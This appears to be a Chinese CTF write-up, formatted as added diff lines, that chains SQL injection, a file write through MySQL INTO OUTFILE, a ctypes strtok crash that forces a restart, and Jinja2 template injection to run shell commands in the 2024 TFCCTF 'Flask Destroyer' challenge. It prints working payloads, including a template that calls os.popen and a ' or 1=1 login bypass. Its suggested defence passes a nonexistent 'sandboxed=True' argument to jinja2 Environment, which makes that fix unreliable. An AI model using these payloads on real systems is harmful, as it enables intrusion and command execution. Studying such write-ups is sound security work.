@@ -1,0 +1,199 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>本文深入探究python flask框架中由于某些函数缺陷，导致flask服务重启进而重新加载模板导致的SSTI漏洞。</p>
+<h3 data-content="1" id="92b41850e1c413b634c979e3cd8c4170">以2024TFCCTF FLASK DESTROYER为例进行分析</h3>
+<p>源码如下：<br/>
+routers.py</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">Blueprint</span><span class="p">,</span> <span class="n">current_app</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">session</span>
+<span class="kn">from</span> <span class="nn">app</span> <span class="kn">import</span> <span class="n">db</span>
+<span class="kn">from</span> <span class="nn">app.forms</span> <span class="kn">import</span> <span class="n">LoginForm</span>
+<span class="kn">from</span> <span class="nn">app.database</span> <span class="kn">import</span> <span class="n">get_user_by_username_password</span>
+<span class="kn">from</span> <span class="nn">app.models</span> <span class="kn">import</span> <span class="n">User</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">bp</span> <span class="o">=</span> <span class="n">Blueprint</span><span class="p">(</span><span class="s1">'main'</span><span class="p">,</span> <span class="vm">__name__</span><span class="p">)</span>
+<span class="n">registered_templates</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s1">'app/templates'</span><span class="p">)</span>
+<span class="nd">@bp.route</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+    <span class="n">form</span> <span class="o">=</span> <span class="n">LoginForm</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">,</span> <span class="n">meta</span><span class="o">=</span><span class="p">{</span><span class="s1">'csrf'</span><span class="p">:</span> <span class="bp">False</span><span class="p">})</span>
+    <span class="k">if</span> <span class="n">form</span><span class="o">.</span><span class="n">validate_on_submit</span><span class="p">():</span>
+        <span class="n">user</span> <span class="o">=</span> <span class="n">get_user_by_username_password</span><span class="p">(</span><span class="n">form</span><span class="o">.</span><span class="n">username</span><span class="o">.</span><span class="n">data</span><span class="p">,</span> <span class="n">form</span><span class="o">.</span><span class="n">password</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
+            <span class="n">session</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="n">id</span>
+            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'main.home'</span><span class="p">))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">flash</span><span class="p">(</span><span class="s1">'Login Unsuccessful. Please check username and password'</span><span class="p">,</span> <span class="s1">'danger'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'login.html'</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="s1">'Login'</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>
+
+<span class="nd">@bp.get</span><span class="p">(</span><span class="s1">'/logout'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
+    <span class="n">session</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'main.login'</span><span class="p">))</span>
+
+<span class="c1"># Define a route with a URL parameter</span>
+<span class="nd">@bp.route</span><span class="p">(</span><span class="s1">'/&lt;string:page&gt;'</span><span class="p">)</span>
+<span class="nd">@bp.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">defaults</span><span class="o">=</span><span class="p">{</span><span class="s1">'page'</span><span class="p">:</span> <span class="s1">'home.html'</span><span class="p">})</span>
+<span class="k">def</span> <span class="nf">home</span><span class="p">(</span><span class="n">page</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'id'</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'main.login'</span><span class="p">))</span>
+
+    <span class="n">page</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">page</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">registered_templates</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">'app/templates'</span><span class="p">,</span> <span class="n">page</span><span class="p">)):</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'home.html'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
+</pre></div>
+<p>我们在database.py文件中明显发现了sql注入漏洞</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">get_user_by_username_password</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="sd">"""Fetch user by username."""</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM user WHERE username = </span><span class="se">\"</span><span class="s2">{}</span><span class="se">\"</span><span class="s2"> AND password = </span><span class="se">\"</span><span class="s2">{}</span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">text</span><span class="p">(</span><span class="n">query</span><span class="p">))</span>
+    <span class="n">row</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="n">row</span><span class="p">:</span>
+        <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span><span class="nb">id</span> <span class="o">=</span> <span class="n">row</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">credentials</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'{row[1]}:{row[2]}'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">user</span>
+    <span class="k">return</span> <span class="bp">None</span>
+</pre></div>
+<ul>
+<li>接着发现可以任意加载templates目录下模板的路由，但是此处的<code>registered_templates = os.listdir('app/templates')</code>在服务启动的时候就已经把模板加载进了变量，所以我们再写入文件，它的这个变量也没有存放，需要我们通过一定手段写文件之后，将服务重启重新加载模板文件。</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="nd">@bp.route</span><span class="p">(</span><span class="s1">'/&lt;string:page&gt;'</span><span class="p">)</span>
+<span class="nd">@bp.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">defaults</span><span class="o">=</span><span class="p">{</span><span class="s1">'page'</span><span class="p">:</span> <span class="s1">'home.html'</span><span class="p">})</span>
+<span class="k">def</span> <span class="nf">home</span><span class="p">(</span><span class="n">page</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'id'</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'main.login'</span><span class="p">))</span>
+
+    <span class="n">page</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">page</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">registered_templates</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">'app/templates'</span><span class="p">,</span> <span class="n">page</span><span class="p">)):</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'home.html'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
+</pre></div>
+<ul>
+<li>通过查看my.cnf配置文件,发现sql可以任意目录写文件(secure_file_priv = "" 由此看出置为空字符串的配置问题)</li>
+</ul>
+<pre><code>[mysqld]
+default-authentication-plugin = mysql_native_password
+secure_file_priv = ""</code></pre>
+<ul>
+<li>观察moudels.py文件，定义了User类，属性名是数据库表的列</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">User</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
+    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="nb">id</span><span class="p">,</span> <span class="n">credentials</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">id</span> <span class="o">=</span> <span class="nb">id</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">credentials</span><span class="p">,</span> <span class="s1">':'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">credentials</span><span class="p">,</span> <span class="s1">':'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="k">def</span> <span class="fm">__repr__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">f</span><span class="s1">'User(id={self.id}, username={self.username}, password={self.password})'</span>
+</pre></div>
+<ul>
+<li>其中我们跟进<code>strtok</code>函数（这是本文的函数缺陷所在）</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">ctypes</span>
+<span class="c1"># Load the C standard library</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">CDLL</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>  <span class="c1"># Automatically finds the C standard library</span>
+<span class="c1"># Define strtok function prototype</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">strtok</span><span class="o">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_char_p</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">strtok</span><span class="o">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">[</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_char_p</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_char_p</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">strtok</span><span class="p">(</span><span class="n">input_string</span><span class="p">,</span> <span class="n">delimiter</span><span class="p">):</span>
+
+    <span class="c1"># Create a ctypes string buffer for the input string</span>
+    <span class="n">input_buffer</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">create_string_buffer</span><span class="p">(</span><span class="n">input_string</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
+
+    <span class="c1"># Tokenize the first part of the string</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">strtok</span><span class="p">(</span><span class="n">input_buffer</span><span class="p">,</span> <span class="n">delimiter</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
+    <span class="n">tokens</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="c1"># Iterate through the tokens</span>
+    <span class="k">while</span> <span class="n">token</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="c1"># Add the token to the list of tokens</span>
+        <span class="n">tokens</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">token</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
+        <span class="c1"># Get the next token</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">strtok</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">delimiter</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
+
+    <span class="c1"># Solve edge case</span>
+    <span class="k">if</span> <span class="n">input_string</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">delimiter</span><span class="p">:</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">string_at</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+        <span class="n">tokens</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">tokens</span>
+</pre></div>
+<ul>
+<li>我们重点关注这段代码,while循环中，通过不断分割将字符串添加到token中，最后剩下<code>None</code>返回给<code>token</code>，而之后下面的代码处理边界情况，用了<code>token</code>作为读取的位置来处理，但此时只能读取到<code>None</code>，因此我们只需要构造结尾是<code>:</code>便会走进<code>if</code>。</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="c1"># Iterate through the tokens</span>
+    <span class="k">while</span> <span class="n">token</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="c1"># Add the token to the list of tokens</span>
+        <span class="n">tokens</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">token</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
+        <span class="c1"># Get the next token</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">strtok</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">delimiter</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
+
+    <span class="c1"># Solve edge case</span>
+    <span class="k">if</span> <span class="n">input_string</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">delimiter</span><span class="p">:</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">string_at</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+        <span class="n">tokens</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">tokens</span>
+</pre></div>
+<ul>
+<li>
+<p>通过本地代码测试，以<code>:</code>结尾的字符串运行会产生内存越界错误（Segmentation fault (core dumped)）<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240804224544-3aa5b3fe-5270-1.png"/></p>
+</li>
+<li>
+<p>下面是添加<code>:</code>结尾前后的运行结果：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240804224553-40223a96-5270-1.png"/></p>
+</li>
+</ul>
+<h3 data-content="1" id="6d46c0db0952429baf1804875dc2d7c2">漏洞利用</h3>
+<ul>
+<li>登录页面sql写恶意模板文件，注意文件路径源码中有</li>
+</ul>
+<div class="highlight"><pre><span></span>username<span class="o">=</span>admin<span class="s">";select "</span><span class="p">{{</span>config.__class__.__init__.__globals__<span class="p">[</span><span class="s">'os'</span><span class="p">]</span><span class="m">.</span>popen<span class="p">(</span><span class="s">'cat /tmp/*/*/*/*'</span><span class="p">)</span><span class="m">.</span>read<span class="p">()}}</span><span class="s">"</span><span class="err"> into outfile '/destroyer/app/templates/a.html';#&amp;password=123&amp;vibe=y</span>
+</pre></div>
+<ul>
+<li>再利用sql注入修改admin密码为<code>1:</code>,此时用<code>admin/1:</code>登录，服务会报错重新登录即可重启服务</li>
+</ul>
+<div class="highlight"><pre><span></span>username<span class="o">=</span>admin<span class="s">"</span><span class="err">;update user set password = '1:' where username = 'admin';#</span>
+</pre></div>
+<ul>
+<li>利用万能密码登录  最后访问<code>a.html</code>恶意模板文件拿到了flag</li>
+</ul>
+<div class="highlight"><pre><span></span>admin<span class="s">"</span><span class="err"> or 1=1#</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240804224610-49ffa2c4-5270-1.png"/></p>
+<h3 data-content="1" id="d8fe00a8ed95778ff7a9a9bb081fd558">防御措施</h3>
+<p>为了防止此类漏洞，可以采取以下措施：</p>
+<ul>
+<li>安全配置：</li>
+</ul>
+<p>确保模板引擎被配置为不允许执行任意代码。在 Flask 中，可以通过设置 autoescape 和 sandboxed 模式来提高安全性。</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">jinja2</span> <span class="kn">import</span> <span class="n">Environment</span><span class="p">,</span> <span class="n">select_autoescape</span>
+
+<span class="n">app</span><span class="o">.</span><span class="n">jinja_env</span> <span class="o">=</span> <span class="n">Environment</span><span class="p">(</span>
+    <span class="n">autoescape</span><span class="o">=</span><span class="n">select_autoescape</span><span class="p">([</span><span class="s1">'html'</span><span class="p">,</span> <span class="s1">'xml'</span><span class="p">]),</span>
+    <span class="n">sandboxed</span><span class="o">=</span><span class="bp">True</span>
+<span class="p">)</span>
+</pre></div>
+<ul>
+<li>
+<p>输入验证：<br/>
+对用户提供的数据进行严格的验证和过滤，避免将未经处理的数据直接传递给模板引擎。</p>
+</li>
+<li>
+<p>最小权限原则：<br/>
+使用沙箱模式限制模板内的功能，例如禁用外部函数调用。</p>
+</li>
+<li>
+<p>使用安全函数：<br/>
+避免使用可能导致 SSTI 的函数，例如直接使用用户提供的字符串作为模板。</p>
+</li>
+<li>
+<p>代码审查：<br/>
+进行代码审查，确保没有直接输入的地方。</p>
+</li>
+</ul>
+</div>
+</div>
